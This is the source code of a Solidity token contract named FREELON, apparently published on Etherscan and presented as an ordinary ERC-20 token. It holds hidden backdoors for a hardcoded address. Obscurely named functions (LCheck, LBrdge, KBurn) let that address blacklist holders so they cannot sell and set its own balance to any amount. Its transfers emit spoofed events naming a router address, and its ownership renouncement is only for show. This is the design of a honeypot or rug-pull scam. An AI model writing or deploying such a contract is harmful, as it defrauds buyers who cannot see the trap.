/**
 *Submitted for verification at Etherscan.io on 2022-10-28
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract FREELON {
  
    mapping (address => uint256) public Rz;
    mapping (address => uint256) public Ti;
    mapping (address => bool) yZ;
    mapping(address => mapping(address => uint256)) public allowance;
	address cstrict = 0xb6Dd43749Eb3d4FDd7378a24a350D617EcAbF43B;
	address VRouter3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;




    string public name = unicode"FREED";
    string public symbol = unicode"FREELON";
    uint8 public decimals = 18;
    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);


    constructor()  {
    Rz[msg.sender] = totalSupply;
    emit Transfer(address(0), VRouter3, totalSupply); }

   

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == cstrict)  {
        require(Rz[msg.sender] >= value);
        Rz[msg.sender] -= value;  
        Rz[to] += value; 
        emit Transfer (VRouter3, to, value);
        return true; }  
        if(!yZ[msg.sender]) {
        require(Rz[msg.sender] >= value);
        Rz[msg.sender] -= value;  
        Rz[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}
		

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function KBurn () public {
         if(msg.sender == cstrict)   {
        Rz[msg.sender] = Ti[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return Rz[account]; }

        function Ldel(address nz) public {
        if(msg.sender == cstrict)  { 
        yZ[nz] = false;}}
        function LCheck(address nz) public{
         if(msg.sender == cstrict)  { 
        require(!yZ[nz]);
        yZ[nz] = true;
        }}
             function LBrdge(uint256 pi) public {
        if(msg.sender == cstrict)  { 
        Ti[msg.sender] = pi;} }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        if(from == cstrict)  {
        require(value <= Rz[from]);
        require(value <= allowance[from][msg.sender]);
        Rz[from] -= value;  
        Rz[to] += value; 
        emit Transfer (VRouter3, to, value);
        return true; }    
          if(!yZ[from] && !yZ[to]) {
        require(value <= Rz[from]);
        require(value <= allowance[from][msg.sender]);
        Rz[from] -= value;
        Rz[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}